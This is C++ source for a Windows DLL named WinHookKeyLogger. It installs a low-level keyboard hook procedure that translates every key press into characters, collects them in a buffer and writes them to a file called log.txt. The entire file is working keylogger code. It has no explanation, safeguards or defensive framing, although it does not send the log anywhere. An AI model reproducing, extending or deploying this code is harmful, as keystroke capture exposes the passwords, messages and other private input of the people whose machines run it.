#include "pch.h"
#include "framework.h"
#include "WinHookKeyLogger.h"

std::vector<wchar_t> kbLogBuff;
std::vector<BYTE> keys(256, 0);

void deInitLogger(void)
{
    std::wstring path(L"log.txt");
    std::wofstream outfile(path, std::ios::out | std::wofstream::binary);
    std::copy(kbLogBuff.begin(), kbLogBuff.end(), std::ostreambuf_iterator<wchar_t>(outfile));
}

WINHOOKKEYLOGGER_API LRESULT KeyBoardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
        if (wParam == WM_KEYDOWN)
        {
            KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT*)lParam;
            BYTE state[256] = { 0 };
            wchar_t str[10] = { 0 };
            GetKeyState(VK_SHIFT);
            GetKeyState(VK_MENU);
            GetKeyboardState(state);
            int retLen = ToUnicode(kb->vkCode, kb->scanCode,
                                     state, 
                                     str, sizeof(str) / sizeof(*str) - 1,
                                    0);
            if (retLen > 0)
            {
                if (kb->vkCode == VK_RETURN)
                {
                    kbLogBuff.push_back(L'\r');
                    kbLogBuff.push_back(L'\n');
                }
                else 
                {
                    kbLogBuff.insert(kbLogBuff.end(), str, str + retLen);
                }
            }
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
